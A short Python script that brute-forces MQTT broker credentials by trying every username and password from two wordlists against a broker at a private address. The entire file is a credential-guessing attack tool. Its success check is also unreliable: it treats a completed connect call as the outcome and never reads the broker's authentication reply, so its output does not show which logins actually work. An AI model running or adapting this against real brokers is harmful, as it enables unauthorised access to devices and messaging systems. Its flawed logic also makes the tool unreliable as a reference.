import time
from paho.mqtt.client import Client


BROKER = "192.168.0.100"
PORT = 1883


with open("users.txt") as f:
    usernames = [u.strip() for u in f if u.strip()]
with open("passwords.txt") as f:
    passwords = [p.strip() for p in f if p.strip()]


print(f"Loaded {len(usernames)} usernames and {len(passwords)} passwords")


for u in usernames:
    for p in passwords:
        try:
            c = Client()
            c.username_pw_set(u, p)
            c.connect(BROKER, PORT, 60)
            c.disconnect()
            print(f"[TRY] {u}:{p}")
        except:
            print(f"[FAIL] {u}:{p}")
        time.sleep(0.05)